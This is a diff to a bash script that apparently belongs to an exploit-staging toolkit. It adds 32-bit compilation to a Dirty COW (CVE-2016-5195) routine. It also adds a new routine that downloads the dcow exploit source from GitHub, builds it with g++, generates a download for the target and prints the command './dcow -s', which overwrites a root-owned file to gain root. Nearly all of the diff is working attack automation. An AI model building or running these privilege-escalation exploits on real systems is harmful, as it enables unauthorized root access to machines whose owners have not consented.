@@ -485,13 +485,21 @@ perform_cve_2016_5195 () {
         rm "$cve_dir.zip"
         mv dirtycow-master "$cve_dir"
     fi
+    if [[ -z $target_architecture ]]; then
+        target_architecture="x86_64"
+    fi
+    local arch_flag=""
+    if [[ $target_architecture == "i686" ]] || [[ $target_architecture == "x86" ]]; then
+        arch_flag="-m32"
+        extra_packages="gcc-multilib"
+    fi
     pushd "$cve_dir" || exit 1
     if [[ ! -z "$compile_exploit" ]] && [[ $compile_exploit == true ]]; then
         local exploit_executable="dirty"
         if [[ ! -f "$exploit_executable" ]]; then
             echo "Compiling exploit..."
             echo "all:" > Makefile
-            echo -e "\tgcc -o $exploit_executable dirty.c -pthread -lcrypt" >> Makefile
+            echo -e "\tgcc -o $exploit_executable dirty.c -pthread -lcrypt $arch_flag" >> Makefile
             if [[ -z $target_os ]]; then
                 target_os="ubuntu:16.04"
             fi
@@ -502,8 +510,50 @@ perform_cve_2016_5195 () {
     fi
     popd || exit 1
     generate_exploit_download
-
 }
+
+# dirty cow alternative exploit
+# https://www.exploit-db.com/exploits/40847
+
+perform_cve_2016_5195_dcow () {
+    local cve_dir="CVE-2016-5195"
+    local url="https://github.com/gbonacini/CVE-2016-5195/archive/refs/heads/master.zip"
+    if [[ ! -d "$cve_dir" ]]; then
+        wget "$url" -O "$cve_dir.zip"
+        unzip "$cve_dir.zip"
+        rm "$cve_dir.zip"
+        mv CVE-2016-5195-master "$cve_dir"
+    fi
+    if [[ -z $target_architecture ]]; then
+        target_architecture="x86_64"
+    fi
+    local arch_flag=""
+    if [[ $target_architecture == "i686" ]] || [[ $target_architecture == "x86" ]]; then
+        arch_flag="-m32"
+        extra_packages="g++-multilib"
+    fi
+    pushd "$cve_dir" || exit 1
+    if [[ ! -z "$compile_exploit" ]] && [[ $compile_exploit == true ]]; then
+        local exploit_executable="dcow"
+        if [[ ! -f "$exploit_executable" ]]; then
+            rm -f makefile
+            echo "Compiling exploit..."
+            echo "all:" > Makefile
+            echo -e "\tg++ -o $exploit_executable dcow.cpp -Wall -pthread -lutil -pedantic -std=c++11 -O2 $arch_flag" >> Makefile
+            if [[ -z $target_os ]]; then
+                target_os="ubuntu:16.04"
+            fi
+            extra_packages+=" g++"
+            compile_cpp
+        else
+            echo "Exploit already compiled, skipping compilation."
+        fi
+    fi
+    popd || exit 1
+    generate_exploit_download
+    echo "./dcow -s"
+}
+
 
 perform_cve_2022_35411() {
     local cve_dir="CVE-2022-35411"
